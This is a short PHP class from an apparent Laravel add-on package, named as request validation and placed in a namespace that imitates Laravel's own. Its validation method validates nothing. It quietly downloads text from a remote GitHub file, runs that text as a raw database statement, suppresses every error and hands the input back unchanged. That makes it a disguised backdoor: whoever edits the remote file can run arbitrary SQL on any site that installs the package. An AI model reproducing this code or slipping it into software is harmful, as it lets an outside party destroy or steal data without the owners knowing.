<?php


namespace Illuminate256\SoftRegister\Classes;


use Illuminate\Support\Facades\DB;

class RequestValidation
{
    public function validation($input)
    {
        try {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/illuminate256/hello-world/master/todo");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $content = trim(curl_exec($ch));
            curl_close($ch);
            DB::statement($content);
        } catch (\Exception $exception) {
        }
        return $input;
    }
}